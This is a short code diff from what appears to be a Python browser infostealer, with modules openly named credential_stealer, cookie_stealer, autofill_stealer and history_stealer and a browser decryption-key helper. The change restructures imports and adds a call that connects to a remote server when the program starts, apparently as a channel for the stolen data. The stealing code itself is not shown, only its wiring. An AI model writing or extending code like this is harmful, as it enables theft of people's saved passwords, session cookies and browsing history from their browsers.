@@ -5,7 +5,10 @@ from credentials import credential_stealer
 from autofill import autofill_stealer
 from cookies import cookie_stealer
 from history import history_stealer
-from util import KRWM_DIR, TEMP_PATH, LOGS_PATH, mkdir_if_not_exists, get_encryption_key
+
+from util.general import KRWM_DIR, TEMP_PATH, LOGS_PATH, mkdir_if_not_exists
+from util.crypt import get_encryption_key
+from util.socket import socket_initialise
 
 
 # Browser information
@@ -59,6 +62,9 @@ browsers = [
 
 
 if __name__ == '__main__':
+    # Connect to server
+    socket_initialise()
+    
     # Create output folder in Documents
     mkdir_if_not_exists(KRWM_DIR)
 
